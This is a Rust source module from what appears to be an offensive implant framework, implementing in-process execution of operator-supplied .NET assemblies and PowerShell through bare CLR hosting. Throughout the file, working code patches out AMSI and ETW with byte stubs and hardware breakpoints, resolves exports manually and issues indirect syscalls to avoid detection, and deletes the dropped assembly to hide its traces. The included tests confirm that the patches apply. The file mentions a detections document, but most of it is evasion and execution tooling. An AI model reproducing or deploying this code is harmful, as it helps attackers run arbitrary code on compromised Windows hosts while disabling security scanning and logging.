//! Execute-assembly (ABR-T025): run an operator-supplied .NET assembly
//! inside the implant through bare CLR hosting — no powershell.exe, no
//! child process, no `Assembly.Load` with loader lock acrobatics.
//!
//! Chain (all through the manual export resolver, nothing in the IAT):
//! `mscoree!CLRCreateInstance(CLSID_CLRMetaHost)` →
//! `ICLRMetaHost::GetRuntime("v4.0.30319")` →
//! `ICLRRuntimeInfo::GetInterface(CLSID_CLRRuntimeHost)` →
//! `ICLRRuntimeHost::Start()` →
//! `ICLRRuntimeHost::ExecuteInDefaultAppDomain(path, type, method, arg)`.
//!
//! `ExecuteInDefaultAppDomain` invokes a PUBLIC STATIC method with the
//! C# signature `int Go(string)` and returns its exit code — the
//! operator convention Abraham documents (the proof assembly and every
//! usage example follow it). The assembly is written to a randomly
//! named file under the process temp directory and deleted after the
//! call; that disk flash is the technique's loudest artifact and is
//! the detection anchor (see docs/detections/abr-t025.md).
//!
//! The COM vtables below are declared with every slot up to the ones
//! used, in the exact order of the SDK metahost.h definitions; the
//! unit test pins the whole chain live on a csc-compiled proof.

use crate::evasion::syscalls;
use std::ffi::c_void;

const MAX_ASSEMBLY: usize = 48_000;

#[repr(C)]
#[derive(Clone, Copy)]
struct Guid {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

const fn guid(data1: u32, data2: u16, data3: u16, data4: [u8; 8]) -> Guid {
    Guid {
        data1,
        data2,
        data3,
        data4,
    }
}

const CLSID_CLR_META_HOST: Guid = guid(
    0x9280_188D,
    0x0E8E,
    0x4867,
    [0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE],
);
const IID_ICLR_META_HOST: Guid = guid(
    0xD332_DB9E,
    0xB9B3,
    0x4125,
    [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
);
// RuntimeHost pair verified against the mingw-w64 mscoree.h header:
// CLSID 0x90F1A06E, IID 0x90F1A06C, both ending ...7A5EBA6BDB02.
const CLSID_CLR_RUNTIME_HOST: Guid = guid(
    0x90F1_A06E,
    0x7712,
    0x4762,
    [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02],
);
const IID_ICLR_RUNTIME_HOST: Guid = guid(
    0x90F1_A06C,
    0x7712,
    0x4762,
    [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02],
);
// Verified against the mingw-w64 mscoree.h and the wine metahost.h:
// both vtable orders below follow those headers exactly.
const IID_ICLR_RUNTIME_INFO: Guid = guid(
    0xBD39_D1D2,
    0xBA2F,
    0x486A,
    [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
);

type ClrCreateInstanceFn = unsafe extern "system" fn(&Guid, &Guid, *mut *mut c_void) -> i32;
type HresultFn = unsafe extern "system" fn(*mut c_void) -> i32;

#[repr(C)]
struct MetaHostVt {
    query_interface: HresultFn,
    add_ref: HresultFn,
    release: HresultFn,
    get_runtime:
        unsafe extern "system" fn(*mut c_void, *const u16, *const Guid, *mut *mut c_void) -> i32,
}

#[repr(C)]
struct RuntimeInfoVt {
    query_interface: HresultFn,
    add_ref: HresultFn,
    release: HresultFn,
    get_version_string: HresultFn,
    get_runtime_directory: HresultFn,
    is_loaded: HresultFn,
    load_error_string: HresultFn,
    load_library: HresultFn,
    get_proc_address: HresultFn,
    get_interface:
        unsafe extern "system" fn(*mut c_void, *const Guid, *const Guid, *mut *mut c_void) -> i32,
    is_loadable: HresultFn,
}

#[repr(C)]
struct RuntimeHostVt {
    query_interface: HresultFn,
    add_ref: HresultFn,
    release: HresultFn,
    start: HresultFn,
    stop: HresultFn,
    set_host_control: HresultFn,
    get_clr_control: HresultFn,
    unload_app_domain: HresultFn,
    execute_in_app_domain: HresultFn,
    get_current_app_domain_id: HresultFn,
    execute_application: HresultFn,
    execute_in_default_app_domain: unsafe extern "system" fn(
        this: *mut c_void,
        assembly_path: *const u16,
        type_name: *const u16,
        method_name: *const u16,
        argument: *const u16,
        return_value: *mut u32,
    ) -> i32,
}

fn wide(text: &str) -> Vec<u16> {
    text.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Pre-start phase of AMSI/ETW neutralization: the legacy byte patch
/// (ABR-T024) BEFORE `CorBindToRuntimeEx`. The runtime initializes fine
/// with the stubs already in place (they answer every scan/scan-write
/// with "invalid argument"/"success"), but the same patch landing on a
/// mid-initialized CLR breaks it (System.ArithmeticException inside the
/// managed EventProvider — found live during the bench rerun), so the
/// patch is the shield for the start and the breakpoints take over after.
fn patch_for_clr_start(notes: &mut Vec<&'static str>) {
    match crate::evasion::patch::patch_amsi() {
        Ok(_) => notes.push("amsi=patched"),
        Err(_) => notes.push("amsi=unavailable"),
        // The error detail is deliberately dropped from the note:
        // failure text would name the very DLL we attempted.
    }
    match crate::evasion::patch::patch_etw() {
        Ok(_) => notes.push("etw=patched"),
        Err(_) => notes.push("etw=unavailable"),
    }
}

/// Post-start phase: once the runtime is up, try the hardware-breakpoint
/// variant (ABR-T036). On success the pre-start byte patch is undone —
/// module bytes return to pristine for memory scanners — and the
/// breakpoints retire the same two functions for the process lifetime.
/// On failure (hypervisor-owned debug registers) the byte patch simply
/// stays. `SetThreadContext` on the debug registers poisons a thread
/// for a SUBSEQUENT runtime start, which is exactly why this runs after
/// `Start()` and never before.
fn suppress_amsi_etw(notes: &mut Vec<&'static str>) {
    if crate::evasion::hwbp::ensure_armed().is_ok() {
        if crate::evasion::patch::unpatch().is_ok() {
            notes.push("amsi=hwbp,etw=hwbp");
            return;
        }
        // Unpatch failed (page flip refused): keep the stubs and say so.
        notes.push("hwbp=armed,patch-kept");
    }
    // Arming blocked (hypervisor-owned debug registers): the pre-start
    // byte patch stays — already reported by patch_for_clr_start.
}

/// Hosts the CLR, runs `type_name.method_name(argument)` from `data`
/// (a .NET Framework assembly) in the default AppDomain and returns an
/// operator-readable one-liner. `patch_first` neutralizes AMSI/ETW for
/// this process before the runtime comes up (failures degrade to a
/// note, they do not block execution).
pub fn exec_assembly(
    data: &[u8],
    type_name: &str,
    method_name: &str,
    argument: &str,
    patch_first: bool,
) -> Result<Vec<u8>, String> {
    if data.is_empty() {
        return Err("empty assembly".into());
    }
    if data.len() > MAX_ASSEMBLY {
        return Err(format!(
            "assembly {}B exceeds {}B cap",
            data.len(),
            MAX_ASSEMBLY
        ));
    }
    let mut notes: Vec<&'static str> = Vec::new();
    let hwbp = crate::evasion::hwbp_requested();
    if patch_first && !hwbp {
        patch_for_clr_start(&mut notes);
    }

    // Random temp name: the disk flash is documented telemetry, but the
    // name carries no project branding.
    let tag: u32 = rand::random();
    let path = std::env::temp_dir().join(format!("{tag:08x}.dll"));
    std::fs::write(&path, data).map_err(|e| format!("temp write failed: {e}"))?;
    let path_text = path.to_string_lossy().into_owned();

    let result = run_in_default_domain(
        &path_text,
        type_name,
        method_name,
        argument,
        (patch_first && hwbp).then_some(suppress_amsi_etw as SuppressHook),
        &mut notes,
    );
    // The CLR maps the assembly and keeps the file handle open without
    // sharing writes, so neither delete nor overwrite can land while it
    // lives. POSIX-style delete-on-close (NtSetInformationFile with
    // FileDispositionInformation) marks the file to vanish as soon as
    // the runtime lets go — the last handle usually the CLR's own.
    let deleted = std::fs::remove_file(&path).is_ok();
    let delete_marked = if deleted {
        false
    } else {
        mark_delete_on_close(&path_text)
    };
    let residue = if !deleted && !delete_marked {
        // The CLR holds the assembly without FILE_SHARE_DELETE for the
        // process lifetime (the load is reused across tasks) — surface
        // the random-named residue path so the operator can collect it.
        format!(" residue={path_text}")
    } else {
        String::new()
    };
    let (hr, ret) = result?;
    let note = if notes.is_empty() {
        String::new()
    } else {
        format!(" ({})", notes.join(","))
    };
    Ok(format!(
        "execasm: {}B hr={hr:#010x} ret={ret:#x} file-deleted={deleted} delete-on-close={delete_marked}{residue}{note}",
        data.len()
    )
    .into_bytes())
}

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *const u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *const UnicodeString,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
struct IoStatusBlock {
    status: isize,
    information: usize,
}

/// Marks `path` for deletion when its last handle closes, through the
/// indirect-syscall layer (NtOpenFile + NtSetInformationFile). False
/// when any step fails — callers report it, they do not fail on it.
fn mark_delete_on_close(path: &str) -> bool {
    unsafe {
        let open = match syscalls::resolve("NtOpenFile") {
            Some(f) => f,
            None => return false,
        };
        let set = match syscalls::resolve("NtSetInformationFile") {
            Some(f) => f,
            None => return false,
        };
        let close = match syscalls::resolve("NtClose") {
            Some(f) => f,
            None => return false,
        };
        let mut wide: Vec<u16> = vec![0x5C, 0x3F, 0x3F, 0x5C]; // \??\ prefix
        wide.extend(path.encode_utf16());
        wide.push(0);
        let name = UnicodeString {
            length: ((wide.len() - 1) * 2) as u16,
            maximum_length: (wide.len() * 2) as u16,
            buffer: wide.as_ptr(),
        };
        let attributes = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: std::ptr::null_mut(),
            object_name: &name,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        };
        let mut iosb = IoStatusBlock {
            status: 0,
            information: 0,
        };
        let mut handle: usize = 0;
        const DELETE_ACCESS: usize = 0x0001_0000;
        const FILE_SHARE_ALL: usize = 0x7;
        // NtOpenFile(FileHandle*, DesiredAccess, ObjectAttributes*,
        //            IoStatusBlock*, ShareAccess, OpenOptions)
        let status = syscalls::dispatch6(
            open,
            &mut handle as *mut usize as usize,
            DELETE_ACCESS,
            &attributes as *const ObjectAttributes as usize,
            &mut iosb as *mut IoStatusBlock as usize,
            FILE_SHARE_ALL,
            0x40, // FILE_NON_DIRECTORY_FILE
        );
        if (status as u32) & 0x8000_0000 != 0 || handle == 0 {
            return false;
        }
        // NtSetInformationFile(FileHandle, IoStatusBlock*,
        //                      FileInformation*, Length, FileInformationClass)
        let mut disposition: i32 = 1; // BOOLEAN DeleteFile = TRUE
        let status = syscalls::dispatch6(
            set,
            handle,
            &mut iosb as *mut IoStatusBlock as usize,
            &mut disposition as *mut i32 as usize,
            4,
            13, // FileDispositionInformation
            0,
        );
        syscalls::dispatch6(close, handle, 0, 0, 0, 0, 0);
        (status as u32) & 0x8000_0000 == 0
    }
}

/// In-process PowerShell execution (ABR-T026): patches AMSI/ETW for
/// this process (mandatory part of the technique - the runspace would
/// otherwise feed every script to AmsiScanBuffer and engine logging
/// rides EtwEventWrite), runs `script` through the operator bootstrap
/// assembly (Boot.Run receives "<outpath>' + BSN + '<script>",
/// compiled from tools/psboot.cs by the teamserver) and returns the
/// script's captured output.
pub fn powershell_run(script: &str, bootstrap: &[u8]) -> Result<Vec<u8>, String> {
    if bootstrap.is_empty() {
        return Err("empty bootstrap".into());
    }
    let mut notes: Vec<&'static str> = Vec::new();
    if !crate::evasion::hwbp_requested() {
        patch_for_clr_start(&mut notes);
    }
    let boot_tag: u32 = rand::random();
    let boot_path = std::env::temp_dir().join(format!("{boot_tag:08x}-ps.dll"));
    let out_tag: u32 = rand::random();
    let out_path = std::env::temp_dir().join(format!("{out_tag:08x}-ps.out"));
    std::fs::write(&boot_path, bootstrap).map_err(|e| format!("bootstrap write: {e}"))?;
    let boot_text = boot_path.to_string_lossy().into_owned();
    let out_text = out_path.to_string_lossy().into_owned();
    let argument = format!("{out_text}\n{script}");

    let result = run_in_default_domain(
        &boot_text,
        "Boot",
        "Run",
        &argument,
        crate::evasion::hwbp_requested().then_some(suppress_amsi_etw as SuppressHook),
        &mut notes,
    );
    let deleted = std::fs::remove_file(&boot_path).is_ok();
    let delete_marked = if deleted {
        false
    } else {
        mark_delete_on_close(&boot_text)
    };
    let output = std::fs::read(&out_path).unwrap_or_else(|_| b"<no output captured>".to_vec());
    let _ = std::fs::remove_file(&out_path);
    let (hr, ret) = result?;
    let mut report = format!("ps: hr={hr:#010x} rc={ret} ({})\n", notes.join(",")).into_bytes();
    report.extend_from_slice(&output);
    if !deleted && !delete_marked {
        report.extend_from_slice(format!("\n[boot residue: {boot_text}]").as_bytes());
    }
    Ok(report)
}

/// The raw hosting chain; separated so the probe test can exercise each
/// HRESULT individually.
/// Suppression hook executed between CLR Start and the managed call:
/// SetThreadContext on the debug registers poisons a thread for the
/// SUBSEQUENT CorBindToRuntimeEx (E_FAIL, bisected live during the
/// bench rerun), so AMSI/ETW neutralization — hardware breakpoints
/// with the byte patch as fallback — must run after the runtime is up
/// and before the engine starts calling AmsiScanBuffer/EtwEventWrite.
type SuppressHook = fn(&mut Vec<&'static str>);

fn run_in_default_domain(
    assembly_path: &str,
    type_name: &str,
    method_name: &str,
    argument: &str,
    suppress: Option<SuppressHook>,
    notes: &mut Vec<&'static str>,
) -> Result<(i32, u32), String> {
    unsafe {
        let create_addr = syscalls::export_address("mscoree.dll", "CLRCreateInstance")
            .ok_or("CLRCreateInstance unresolved")?;
        let create: ClrCreateInstanceFn = std::mem::transmute(create_addr);

        let mut meta_host: *mut c_void = std::ptr::null_mut();
        let hr = create(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
        if hr != 0 || meta_host.is_null() {
            return Err(format!("CLRCreateInstance failed: {hr:#010x}"));
        }

        let version = wide("v4.0.30319");
        let mut runtime_info: *mut c_void = std::ptr::null_mut();
        let meta_vt = &*(*(meta_host as *const *const MetaHostVt));
        let hr = (meta_vt.get_runtime)(
            meta_host,
            version.as_ptr(),
            &IID_ICLR_RUNTIME_INFO,
            &mut runtime_info,
        );
        if hr != 0 || runtime_info.is_null() {
            (meta_vt.release)(meta_host);
            return Err(format!("GetRuntime failed: {hr:#010x}"));
        }

        let mut runtime_host: *mut c_void = std::ptr::null_mut();
        let info_vt = &*(*(runtime_info as *const *const RuntimeInfoVt));
        // Sanity before any far-slot call: the vtable slots must look
        // like module code pointers, not garbage from a bare IUnknown.
        let sane = |slot: usize| slot > 0x1_0000 && slot >> 32 != 0;
        let vt_ok = [
            (info_vt.get_version_string) as usize,
            (info_vt.get_runtime_directory) as usize,
            (info_vt.is_loaded) as usize,
            (info_vt.load_error_string) as usize,
            (info_vt.load_library) as usize,
            (info_vt.get_proc_address) as usize,
            (info_vt.get_interface) as usize,
            (info_vt.is_loadable) as usize,
        ]
        .iter()
        .all(|slot| sane(*slot));
        if !vt_ok {
            (meta_vt.release)(meta_host);
            (info_vt.release)(runtime_info);
            return Err("runtime-info vtable sanity failed".into());
        }
        let hr = (info_vt.get_interface)(
            runtime_info,
            &CLSID_CLR_RUNTIME_HOST,
            &IID_ICLR_RUNTIME_HOST,
            &mut runtime_host,
        );
        (meta_vt.release)(meta_host);
        if hr != 0 || runtime_host.is_null() {
            (info_vt.release)(runtime_info);
            return Err(format!("GetInterface failed: {hr:#010x}"));
        }
        let host_vt = &*(*(runtime_host as *const *const RuntimeHostVt));

        // Start() on an already-running CLR answers S_FALSE (1) —
        // success, not an error (any second managed task in the same
        // process takes this path).
        let hr = (host_vt.start)(runtime_host);
        if hr != 0 && hr != 1 {
            (host_vt.release)(runtime_host);
            (info_vt.release)(runtime_info);
            return Err(format!("CLR Start failed: {hr:#010x}"));
        }

        // Suppression lands here on purpose — see SuppressHook.
        if let Some(hook) = suppress {
            hook(notes);
        }

        let path = wide(assembly_path);
        let type_w = wide(type_name);
        let method_w = wide(method_name);
        let arg_w = wide(argument);
        let mut ret: u32 = 0;
        let hr = (host_vt.execute_in_default_app_domain)(
            runtime_host,
            path.as_ptr(),
            type_w.as_ptr(),
            method_w.as_ptr(),
            arg_w.as_ptr(),
            &mut ret,
        );
        (host_vt.release)(runtime_host);
        (info_vt.release)(runtime_info);
        if hr != 0 {
            return Err(format!("ExecuteInDefaultAppDomain failed: {hr:#010x}"));
        }
        Ok((hr, ret))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // No Console output in the proof: writing to the test harness's
    // captured stderr pipe interacted flakily with the CLR's console
    // initialization inside a capture-parented process (intermittent
    // access violations at suite level). The managed exit code is the
    // whole proof.
    const PROOF_CS: &str = r"
public static class Prog {
    public static int Go(string a) {
        return 0x1337 + (a == null ? 0 : 0);
    }
}
";

    #[test]
    fn delete_on_close_removes_uncontended_file() {
        let tag: u32 = rand::random();
        let path = std::env::temp_dir().join(format!("{tag:08x}-doc.txt"));
        std::fs::write(&path, b"residue").unwrap();
        let path_text = path.to_string_lossy().into_owned();
        assert!(mark_delete_on_close(&path_text), "mark failed");
        // Our own handle is closed inside the helper; with no other
        // handles the POSIX delete lands immediately.
        assert!(!path.exists(), "file survived delete-on-close");
    }

    /// Full in-process PowerShell roundtrip on the host: compiles the
    /// real bootstrap from tools/psboot.cs with the in-box csc, runs a
    /// script through it and checks the captured output. Serial/ignored:
    /// hosts the CLR and rewires AMSI/ETW in the test process.
    #[test]
    #[ignore = "hosts the CLR and patches AMSI/ETW; run with --test-threads=1"]
    fn powershell_run_proof() {
        let csc = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe";
        if !std::path::Path::new(csc).exists() {
            eprintln!("csc not present; skipping");
            return;
        }
        let dir = std::env::temp_dir().join("abraham_psboot_test");
        std::fs::create_dir_all(&dir).unwrap();
        let cs = dir.join("psboot.cs");
        let dll = dir.join("psboot.dll");
        std::fs::write(&cs, include_str!("../../tools/psboot.cs")).unwrap();
        let out = std::process::Command::new(csc)
            .args(["/nologo", "/target:library"])
            .arg(format!("/out:{}", dll.display()))
            .arg(cs.to_string_lossy().as_ref())
            .output()
            .expect("csc run");
        assert!(
            out.status.success(),
            "csc failed: {}",
            String::from_utf8_lossy(&out.stdout)
        );
        let bootstrap = std::fs::read(&dll).unwrap();
        let script = "$v = 0x1337; Write-Output ('ps-proof:' + $v)";
        let report = powershell_run(script, &bootstrap).expect("powershell_run");
        let text = String::from_utf8_lossy(&report);
        eprintln!("ps report: {text}");
        assert!(text.contains("amsi=patched"), "patch note missing: {text}");
        assert!(
            text.contains("ps-proof:4919"),
            "script output missing: {text}"
        );
        assert!(text.contains("rc=0"), "non-zero rc: {text}");
    }

    /// Compiles the proof assembly with the in-box .NET Framework csc
    /// and runs it through the full hosting chain (plus AMSI/ETW
    /// patching) inside this test process. Serial/ignored because it
    /// loads the CLR into the test process.
    #[test]
    #[ignore = "hosts the CLR and compiles with csc; run with --test-threads=1"]
    fn exec_assembly_proof() {
        let csc = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe";
        if !std::path::Path::new(csc).exists() {
            eprintln!("csc not present; skipping");
            return;
        }
        let dir = std::env::temp_dir().join("abraham_execasm_test");
        std::fs::create_dir_all(&dir).unwrap();
        let cs = dir.join("proof.cs");
        let dll = dir.join("proof.dll");
        std::fs::write(&cs, PROOF_CS).unwrap();
        let out = std::process::Command::new(csc)
            .args(["/nologo", "/target:library"])
            .arg(format!("/out:{}", dll.display()))
            .arg(cs.to_string_lossy().as_ref())
            .output()
            .expect("csc run");
        assert!(
            out.status.success(),
            "csc failed: {}",
            String::from_utf8_lossy(&out.stdout)
        );
        let data = std::fs::read(&dll).unwrap();
        let result = exec_assembly(&data, "Prog", "Go", "lab", true).expect("exec_assembly");
        let text = String::from_utf8_lossy(&result);
        eprintln!("execasm result: {text}");
        assert!(text.contains("ret=0x1337"), "unexpected result: {text}");
        assert!(
            text.contains("amsi=patched") && text.contains("etw=patched"),
            "patches: {text}"
        );
        assert!(
            text.contains("file-deleted=true")
                || text.contains("delete-on-close=true")
                || text.contains("residue="),
            "assembly residue not handled: {text}"
        );
    }
}
